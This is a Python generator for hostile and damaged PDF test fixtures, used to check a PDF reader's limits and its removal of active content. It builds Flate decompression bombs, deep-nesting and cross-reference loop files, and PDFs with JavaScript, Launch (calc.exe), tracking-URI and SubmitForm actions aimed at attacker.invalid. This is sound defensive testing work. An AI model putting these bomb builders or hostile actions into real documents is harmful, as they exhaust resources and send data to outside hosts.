#!/usr/bin/env python3
"""Generate the hostile and damaged PDF fixtures (`F-005`, docs/21, docs/07 §PDF input).

    python3 -I fixtures/tools/generate.py            # writes fixtures/hostile/*.pdf
    python3 -I fixtures/tools/generate.py --check    # manifest and docs/21 agree with this script

Standard library only; every file is synthetic and nothing is downloaded. The PDFs are
not committed (several are tens of megabytes, and zlib's bytes may differ between
versions); this script and `fixtures/hostile/manifest.tsv` are. Builders started from
`spikes/spk-01-pdf-reader/gen_fixtures.py` (ours, `SPK-01`).

The manifest gives, per file: the docs/21 limits it crosses, `; `-separated and spelt as docs/21 spells them (or
`control`, `recovery`, `active`),
the code the reader returns under `strict`, and what the default, recovering reader must
do (`refuse`, `open+report`, `open+remove`). `--check` fails when a manifest row names a
file this script does not write, when the script writes a file the manifest lacks, or
when a PDF limit in docs/21 with a code has no fixture and no stated reason.
"""
import pathlib
import re
import sys
import zlib

ROOT = pathlib.Path(__file__).resolve().parents[2]
OUT = ROOT / "fixtures" / "hostile"
MANIFEST = OUT / "manifest.tsv"
LIMITS_DOC = ROOT / "docs" / "21-PARSER-LIMITS.md"
HEADER = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
MIB = 1 << 20

# docs/21 PDF limits that have no fixture file, and why.
NO_FIXTURE = {
    "Envelope total": "an envelope-level limit, tested by the server with several documents (Phase 2)",
    "Time budget": "a host-supplied predicate, tested by a test that cancels, not by a file",
}


def stream_obj(dict_body, data):
    return b"<<" + dict_body + b"/Length %d>>\nstream\n" % len(data) + data + b"\nendstream"


def classic(objs, trailer_extra=b""):
    """A file with a classic xref table. objs: [(number, body)]. Returns (bytes, xref offset)."""
    out = bytearray(HEADER)
    offs = {}
    for num, body in objs:
        offs[num] = len(out)
        out += b"%d 0 obj\n" % num + body + b"\nendobj\n"
    size = max(offs) + 1
    xref_pos = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
    for n in range(1, size):
        out += (b"%010d 00000 n \n" % offs[n]) if n in offs else b"0000000000 65535 f \n"
    out += b"trailer\n<</Size %d/Root 1 0 R%s>>\nstartxref\n%d\n%%%%EOF\n" % (size, trailer_extra, xref_pos)
    return bytes(out), xref_pos


def xref_stream_file(objs, compressed=None, size_override=None, index_override=None):
    """A file with an xref stream (W [1 4 2]). compressed: {number: (object stream, index)}."""
    compressed = compressed or {}
    out = bytearray(HEADER)
    offs = {}
    for num, body in objs:
        offs[num] = len(out)
        out += b"%d 0 obj\n" % num + body + b"\nendobj\n"
    xref_num = max(list(offs) + list(compressed)) + 1
    offs[xref_num] = len(out)
    size = xref_num + 1
    rows = bytearray()
    for n in range(size):
        if n in compressed:
            stm, idx = compressed[n]
            rows += bytes([2]) + stm.to_bytes(4, "big") + idx.to_bytes(2, "big")
        elif n in offs:
            rows += bytes([1]) + offs[n].to_bytes(4, "big") + (0).to_bytes(2, "big")
        else:
            rows += bytes([0]) + (0).to_bytes(4, "big") + (65535).to_bytes(2, "big")
    size_txt = size_override or b"%d" % size
    index = index_override or b"[0 %d]" % size
    d = b"/Type/XRef/Size %s/Index%s/W[1 4 2]/Root 1 0 R/Filter/FlateDecode" % (size_txt, index)
    out += b"%d 0 obj\n" % xref_num + stream_obj(d, zlib.compress(bytes(rows))) + b"\nendobj\n"
    out += b"startxref\n%d\n%%%%EOF\n" % offs[xref_num]
    return bytes(out)


def pages_objs(n_pages=1, first=3):
    """Catalog (1), Pages (2), and n pages with a small Flate content stream each."""
    kids = b" ".join(b"%d 0 R" % (first + 2 * i) for i in range(n_pages))
    objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[%s]/Count %d>>" % (kids, n_pages))]
    for i in range(n_pages):
        content = zlib.compress(b"BT /F1 12 Tf 72 720 Td (Page %d) Tj ET" % (i + 1))
        objs.append((first + 2 * i, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents %d 0 R>>" % (first + 1 + 2 * i)))
        objs.append((first + 1 + 2 * i, stream_obj(b"/Filter/FlateDecode", content)))
    return objs


def zeros_deflate(prefix, n_zero):
    c = zlib.compressobj(9)
    parts = [c.compress(prefix)]
    chunk = b"\0" * MIB
    left = n_zero
    while left > 0:
        take = min(left, MIB)
        parts.append(c.compress(chunk[:take]))
        left -= take
    parts.append(c.flush())
    return b"".join(parts)


def with_catalog_entry(entry):
    objs = pages_objs(1)
    objs[0] = (1, b"<</Type/Catalog/Pages 2 0 R" + entry + b">>")
    return objs


def builders():
    """name -> function returning the file's bytes. Order is the manifest's order."""
    b = {}
    valid, xref_pos = classic(pages_objs(3))

    # Controls: these must open cleanly.
    b["valid.pdf"] = lambda: valid
    b["valid_xrefstream.pdf"] = lambda: xref_stream_file(pages_objs(3))

    # File size: a valid file padded with a comment to 50 MiB + 1 byte.
    def too_large():
        pad = 50 * MIB + 1 - len(valid) - 3
        return valid[: len(HEADER)] + b"%" + b"x" * pad + b"\n" + valid[len(HEADER):]
    b["too_large.pdf"] = too_large

    # Indirect objects: 1,000,001, all reachable.
    def many_objects():
        n = 1_000_001
        out = bytearray(HEADER)
        offs = {}
        for i in range(10, 10 + n):
            offs[i] = len(out)
            out += b"%d 0 obj %d endobj\n" % (i, i)
        arr = 10 + n
        offs[arr] = len(out)
        out += b"%d 0 obj [" % arr + b" ".join(b"%d 0 R" % i for i in range(10, 10 + n)) + b"] endobj\n"
        for num, body in [(1, b"<</Type/Catalog/Pages 2 0 R/Many %d 0 R>>" % arr),
                          (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                          (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>")]:
            offs[num] = len(out)
            out += b"%d 0 obj\n" % num + body + b"\nendobj\n"
        size = arr + 1
        xp = len(out)
        out += b"xref\n0 %d\n" % size
        out += b"".join((b"%010d 00000 n \n" % offs[i]) if i in offs else b"0000000000 65535 f \n" for i in range(size))
        out += b"trailer\n<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n" % (size, xp)
        return bytes(out)
    b["many_objects.pdf"] = many_objects

    # /Size far beyond anything present, in a table and in a stream.
    b["xref_size_2g_table.pdf"] = lambda: valid.replace(b"/Size 9/", b"/Size 2147483648/", 1)
    b["xref_size_2g_stream.pdf"] = lambda: xref_stream_file(pages_objs(1), size_override=b"2147483648",
                                                            index_override=b"[0 2147483648]")

    # Revisions: 1,001 incremental updates, each rewriting the catalog.
    def revisions_1001():
        body, xp = classic(pages_objs(1))
        out = bytearray(body)
        prev = xp
        for k in range(1001):
            pos = len(out)
            out += b"1 0 obj\n<</Type/Catalog/Pages 2 0 R/Rev %d>>\nendobj\n" % k
            xr = len(out)
            out += b"xref\n1 1\n%010d 00000 n \ntrailer\n<</Size 5/Root 1 0 R/Prev %d>>\nstartxref\n%d\n%%%%EOF\n" % (pos, prev, xr)
            prev = xr
        return bytes(out)
    b["revisions_1001.pdf"] = revisions_1001

    # /Prev loops.
    def prev_loops():
        body, xp1 = classic(pages_objs(1), trailer_extra=b"/Prev 0000000000")
        upd = bytearray(body)
        pos = len(upd)
        upd += b"1 0 obj\n<</Type/Catalog/Pages 2 0 R/Updated true>>\nendobj\n"
        ux = len(upd)
        upd += b"xref\n1 1\n%010d 00000 n \ntrailer\n<</Size 5/Root 1 0 R/Prev %d>>\nstartxref\n%d\n%%%%EOF\n" % (pos, xp1, ux)
        loop = bytes(upd).replace(b"/Prev 0000000000", b"/Prev %010d" % ux, 1)
        selfloop = body.replace(b"/Prev 0000000000", b"/Prev %010d" % xp1, 1)
        return loop, selfloop
    b["prev_loop.pdf"] = lambda: prev_loops()[0]
    b["prev_self_loop.pdf"] = lambda: prev_loops()[1]

    # Nesting: 257 (one over the limit) and 10^5, arrays and dictionaries.
    b["nesting_257_arrays.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"[" * 257 + b"]" * 257))[0]
    b["nesting_100k_arrays.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"[" * 100_000 + b"]" * 100_000))[0]
    b["nesting_100k_dicts.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"<</A " * 100_000 + b"1" + b">>" * 100_000))[0]

    # Reference resolution depth: a chain of 65 indirect references, 10 -> 11 -> ... -> 75.
    def ref_chain_65():
        objs = with_catalog_entry(b"/Chain 10 0 R")
        objs += [(10 + i, b"%d 0 R" % (11 + i)) for i in range(65)] + [(75, b"(end)")]
        return classic(objs)[0]
    b["ref_chain_65.pdf"] = ref_chain_65

    # Single stream over 256 MiB decoded (1 GiB of zeros), in content and in an object stream.
    def flate_bomb_content():
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/FlateDecode", zeros_deflate(b"", 1 << 30)))
        return classic(objs)[0]
    b["flate_bomb_content.pdf"] = flate_bomb_content

    def flate_bomb_objstm():
        hdr = b"3 0 "
        data = zeros_deflate(hdr + b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>", 1 << 30)
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (5, stream_obj(b"/Type/ObjStm/N 1/First %d/Filter/FlateDecode" % len(hdr), data))]
        return xref_stream_file(objs, compressed={3: (5, 0)})
    b["flate_bomb_objstm.pdf"] = flate_bomb_objstm

    # Total decoded over 1 GiB: eight object streams of 250 MiB, each under the per-stream cap.
    def flate_bomb_many():
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>")]
        compressed = {}
        for k in range(8):
            hdr = b"%d 0 " % (10 + k)
            objs.append((20 + k, stream_obj(b"/Type/ObjStm/N 1/First %d/Filter/FlateDecode" % len(hdr),
                                             zeros_deflate(hdr + b"null", 250 * MIB))))
            compressed[10 + k] = (20 + k, 0)
        return xref_stream_file(objs, compressed=compressed)
    b["flate_bomb_many.pdf"] = flate_bomb_many

    # Ratio: Flate applied twice, so 64 MiB of zeros fits in a few hundred bytes.
    def flate_double():
        once = zeros_deflate(b"", 64 * MIB)
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter[/FlateDecode/FlateDecode]", zlib.compress(once, 9)))
        return classic(objs)[0]
    b["flate_double.pdf"] = flate_double

    # Filter chain of 9.
    def filter_chain_9():
        data = b"BT ET"
        for _ in range(9):
            data = data.hex().encode() + b">"
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter[" + b"/ASCIIHexDecode" * 9 + b"]", data))
        return classic(objs)[0]
    b["filter_chain_9.pdf"] = filter_chain_9

    # Pages: 5,001; and a page-tree cycle.
    def pages_5001():
        n = 5001
        kids = b" ".join(b"%d 0 R" % (3 + i) for i in range(n))
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[%s]/Count %d>>" % (kids, n))]
        objs += [(3 + i, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>") for i in range(n)]
        return classic(objs)[0]
    b["pages_5001.pdf"] = pages_5001
    b["page_tree_cycle.pdf"] = lambda: classic([
        (1, b"<</Type/Catalog/Pages 2 0 R>>"),
        (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
        (3, b"<</Type/Pages/Parent 2 0 R/Kids[2 0 R 4 0 R]/Count 1>>"),
        (4, b"<</Type/Page/Parent 3 0 R/MediaBox[0 0 612 792]>>")])[0]

    # String over 16 MiB; name of 128 bytes.
    b["string_16mib_plus.pdf"] = lambda: classic(with_catalog_entry(b"/S (" + b"a" * (16 * MIB + 1) + b")"))[0]
    b["name_128.pdf"] = lambda: classic(with_catalog_entry(b"/" + b"N" * 128 + b" 1"))[0]

    # Text extraction: 2,000,001 operators in one page's content.
    def content_ops():
        ops = b"BT " + b"(a) Tj " * 2_000_001 + b"ET"
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/FlateDecode", zlib.compress(ops, 9)))
        return classic(objs)[0]
    b["content_ops_2m.pdf"] = content_ops

    # Damage the recovering reader repairs.
    b["truncated.pdf"] = lambda: valid[: len(valid) * 6 // 10]

    def broken_offsets():
        head, _, tail = valid.partition(b"xref\n")
        fixed = []
        for ln in tail.split(b"\n"):
            if len(ln) == 19 and ln.endswith(b" n "):
                ln = b"%010d" % (int(ln[:10]) + 5) + ln[10:]
            fixed.append(ln)
        return head + b"xref\n" + b"\n".join(fixed)
    b["broken_xref_offsets.pdf"] = broken_offsets
    b["broken_startxref.pdf"] = lambda: valid.replace(b"startxref\n%d" % xref_pos, b"startxref\n%d" % (xref_pos - 40), 1)

    def objstm_self():
        inner = b"<</Type/Pages/Kids[3 0 R]/Count 1>>"
        hdr = b"2 0 5 %d " % len(inner)
        payload = zlib.compress(hdr + inner + b"<</Type/ObjStm>>")
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"),
                (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>"),
                (5, stream_obj(b"/Type/ObjStm/N 2/First %d/Extends 5 0 R/Filter/FlateDecode" % len(hdr), payload))]
        return xref_stream_file(objs, compressed={2: (5, 0), 5: (5, 1)})
    b["objstm_self.pdf"] = objstm_self

    # Active content the normalizer removes (docs/30 §3, SEC-P06 to SEC-P08).
    b["active_openaction_js.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/JavaScript/JS(app.alert\\(1\\))>>"))[0]
    b["active_launch.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/Launch/F(calc.exe)>>"))[0]
    b["active_uri_on_open.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/URI/URI(https://attacker.invalid/track)>>"))[0]
    b["active_submitform.pdf"] = lambda: classic(with_catalog_entry(
        b"/AA<</WC<</S/SubmitForm/F<</FS/URL/F(https://attacker.invalid/)>>>>>>"))[0]

    def embedded_file():
        objs = with_catalog_entry(b"/Names<</EmbeddedFiles<</Names[(a.exe) 10 0 R]>>>>")
        objs += [(10, b"<</Type/Filespec/F(a.exe)/EF<</F 11 0 R>>>>"),
                 (11, stream_obj(b"/Type/EmbeddedFile", b"MZ not really an executable"))]
        return classic(objs)[0]
    b["active_embedded_file.pdf"] = embedded_file
    return b


def read_manifest():
    rows = []
    for line in MANIFEST.read_text(encoding="utf8").splitlines()[1:]:
        if line.strip():
            rows.append(line.split("\t"))
    return rows


def check():
    problems = []
    names = list(builders())
    rows = read_manifest()
    listed = [r[0] for r in rows]
    for r in rows:
        if len(r) != 5:
            problems.append(f"manifest row has {len(r)} columns, not 5: {r[0]}")
    for n in names:
        if n not in listed:
            problems.append(f"{n}: written by the generator, missing from the manifest")
    for n in listed:
        if n not in names:
            problems.append(f"{n}: in the manifest, not written by the generator")
    covered = {lim for r in rows if len(r) == 5 for lim in r[1].split("; ")}
    pdf = LIMITS_DOC.read_text(encoding="utf8").split("## PDF", 1)[1].split("\n## ", 1)[0]
    for line in pdf.splitlines():
        cells = [c.strip() for c in line.strip().strip("|").split("|")]
        if len(cells) == 4 and cells[2].startswith("CS-") and cells[0] not in covered and cells[0] not in NO_FIXTURE:
            problems.append(f"docs/21 limit has no fixture and no reason: {cells[0]}")
    if problems:
        print("hostile fixtures out of step (fixtures/tools/generate.py --check):", file=sys.stderr)
        for p in problems:
            print(f"  {p}", file=sys.stderr)
        return 1
    print(f"hostile fixtures: {len(names)} files, manifest and docs/21 agree")
    return 0


def main(argv):
    if argv[1:] == ["--check"]:
        return check()
    if len(argv) > 1:
        print(__doc__, file=sys.stderr)
        return 2
    OUT.mkdir(parents=True, exist_ok=True)
    for name, build in builders().items():
        data = build()
        (OUT / name).write_bytes(data)
        print(f"{name:28} {len(data):>12,}")
    return check()


if __name__ == "__main__":
    sys.exit(main(sys.argv))
